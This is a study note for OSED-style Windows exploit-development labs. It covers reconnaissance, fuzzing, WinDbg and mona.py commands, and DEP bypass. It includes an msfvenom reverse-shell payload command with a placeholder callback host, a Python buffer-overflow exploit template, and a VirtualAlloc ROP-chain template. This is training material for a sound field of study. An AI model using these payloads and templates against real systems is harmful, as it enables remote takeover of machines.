---
tags:
  - Binary_Exploitation
  - Exploitation
  - Lab
  - Windows
---

## OSED Challenge Lab Methodology
resources: [OffSec EXP-301](https://www.offsec.com/courses/exp-301/)

> Systematic approach for tackling Windows exploit development challenges.

### Lab Approach Overview [Knowledge]
> [!info] General methodology for exploit development labs:
> 1. **Reconnaissance** - Understand target application
> 2. **Vulnerability Discovery** - Find the bug
> 3. **Exploitation Planning** - Design exploit strategy
> 4. **Exploit Development** - Build working exploit
> 5. **Testing & Refinement** - Debug and polish

### Phase 1: Reconnaissance
> Gather information about target.

```text
; Enumerate target application
- What does it do? (network service, file parser, etc.)
- What protocol/format does it use?
- What version/build?
- What protections are enabled?

; Check protections
!mona modules
Get-ProcessMitigation -Name <Process>

; Note architecture
- 32-bit or 64-bit?
- Which OS version?
```

### Phase 2: Vulnerability Discovery
> Find the exploitable bug.

```text
; Identify attack surface
- Network listeners (ports, protocols)
- File parsing (formats accepted)
- User input handling

; Fuzz inputs
- Network protocols: size fields, opcodes
- File formats: headers, length fields
- Look for crashes

; Analyze crashes
!analyze -v
r
!exchain
kb
```

### Phase 3: Exploitation Planning
> Design exploit strategy based on conditions.

```text
; Determine exploit type
- Stack overflow → Return address or SEH?
- Heap overflow → Corruption primitive?
- Format string → Read/Write primitive?

; Check for bad characters
!mona bytearray -cpb "\x00"
!mona compare -a <ESP> -f bytearray.bin

; Identify available space
- How much controlled buffer?
- Where does shellcode fit?

; Plan DEP/ASLR bypass
- Non-ASLR module available?
- Information leak possible?
- ROP gadgets available?
```

### Phase 4: Exploit Development
> Build the exploit step by step.

```text
; Step 1: Control EIP/SEH
- Find exact offset
- Verify control

; Step 2: Find return address/gadgets
!mona jmp -r esp
!mona rop -m <Module>

; Step 3: Handle bad characters
- Encode shellcode
- Find clean gadgets

; Step 4: Build payload
- ROP chain (if DEP)
- Egghunter (if space limited)
- Direct shellcode (if no DEP)

; Step 5: Add shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b "<BadChars>"
```

### Phase 5: Testing & Debugging
> Verify and debug exploit.

```text
; Set breakpoints at key locations
bp <ReturnAddress>
bp <ShellcodeStart>

; Verify each stage
- EIP control
- Gadget execution
- Shellcode decoding
- Shell connection

; Common issues
- Bad characters in addresses
- Stack alignment
- Shellcode corruption
- Timing issues
```

### Quick Reference Commands
> Essential **WinDbg** and **mona.py** commands for lab work.

```text
; WinDbg basics
g                           ; Run
bp <addr>                   ; Breakpoint
bl                          ; List breakpoints
bc *                        ; Clear all breakpoints
p                           ; Step over
t                           ; Step into
r                           ; Registers
dd esp L10                  ; Dump stack
db <addr> L50               ; Dump bytes
u <addr> L10                ; Disassemble

; Mona essentials
!mona config -set workingfolder C:\mona\%p
!mona pc 5000               ; Create pattern
!mona po <value>            ; Find offset
!mona modules               ; List modules
!mona jmp -r esp            ; Find JMP ESP
!mona rop -m <Module>       ; Generate ROP
!mona bytearray -cpb "\x00" ; Bad char array
!mona compare -a esp -f bytearray.bin
```

### Exploit Template
> Starting point for exploit scripts.

```python
#!/usr/bin/env python3
"""
Target: <Application Name>
Vulnerability: <Type>
Author: <Name>
"""

import socket
import struct
import sys

def p32(addr):
    return struct.pack("<I", addr)

# Configuration
TARGET_IP = "<TargetIP>"
TARGET_PORT = <Port>
TIMEOUT = 5

# Offsets and addresses
OFFSET = 0          # Offset to EIP/SEH
EIP = p32(0x41414141)  # Return address

# Shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b "\x00"
shellcode = b""
shellcode += b"\x90" * 16  # NOP sled

def build_exploit():
    """Construct exploit payload"""
    buffer = b"A" * OFFSET
    buffer += EIP
    buffer += b"\x90" * 16
    buffer += shellcode
    return buffer

def send_exploit(payload):
    """Send payload to target"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(payload)
        s.close()
        print("[+] Payload sent")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    print(f"[*] Targeting {TARGET_IP}:{TARGET_PORT}")
    payload = build_exploit()
    print(f"[*] Payload size: {len(payload)} bytes")
    send_exploit(payload)

if __name__ == "__main__":
    main()
```

### ROP Exploit Template
> Template with ROP chain support.

```python
#!/usr/bin/env python3
"""DEP Bypass with ROP"""

import socket
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Module base (update after info leak or static analysis)
BASE = 0x10000000

# Gadget offsets (find with !mona rop)
GADGETS = {
    'pop_eax': BASE + 0x1000,
    'pop_ecx': BASE + 0x1004,
    'pop_edx': BASE + 0x1008,
    'pop_ebx': BASE + 0x100c,
    'pop_ebp': BASE + 0x1010,
    'pop_esi': BASE + 0x1014,
    'pop_edi': BASE + 0x1018,
    'pushad': BASE + 0x101c,
    'ret': BASE + 0x1020,
}

# VirtualAlloc address
VIRTUALALLOC = BASE + 0x2000

def build_rop_chain():
    """Build ROP chain for VirtualAlloc"""
    rop = b""

    # Set up registers for PUSHAD
    rop += p32(GADGETS['pop_eax'])
    rop += p32(0x90909090)  # NOP for EAX

    rop += p32(GADGETS['pop_ecx'])
    rop += p32(0x00000040)  # PAGE_EXECUTE_READWRITE

    rop += p32(GADGETS['pop_edx'])
    rop += p32(0x00003000)  # MEM_COMMIT | MEM_RESERVE

    rop += p32(GADGETS['pop_ebx'])
    rop += p32(0x00001000)  # Size

    rop += p32(GADGETS['pop_ebp'])
    rop += p32(GADGETS['ret'])  # Return after VirtualAlloc

    rop += p32(GADGETS['pop_esi'])
    rop += p32(VIRTUALALLOC)

    rop += p32(GADGETS['pop_edi'])
    rop += p32(GADGETS['ret'])  # ROP NOP

    rop += p32(GADGETS['pushad'])

    return rop

# Shellcode
shellcode = b"\xcc" * 100  # INT3 for testing

# Build exploit
OFFSET = 260
buffer = b"A" * OFFSET
buffer += build_rop_chain()
buffer += b"\x90" * 16
buffer += shellcode
```

### Debugging Checklist
> Systematic debugging approach.

```text
[ ] Verify EIP control at correct offset
[ ] Confirm return address is reached
[ ] Check for bad characters in:
    [ ] Return address
    [ ] ROP gadget addresses
    [ ] Shellcode
[ ] Verify ROP chain executes correctly
[ ] Confirm VirtualAlloc/VirtualProtect succeeds
[ ] Check shellcode is reached and executed
[ ] Verify shell connection
```

### Common Pitfalls [Knowledge]
> [!warning] Frequent issues in exploit development:
> - **Wrong offset**: Re-verify with pattern, account for all fields
> - **Bad characters**: Check all parts of payload, not just shellcode
> - **Stack alignment**: Some functions require 16-byte alignment
> - **DEP**: Check if shellcode location is executable
> - **ASLR**: Verify addresses after reboot
> - **Null terminators**: strcpy-based overflows truncate at NULL

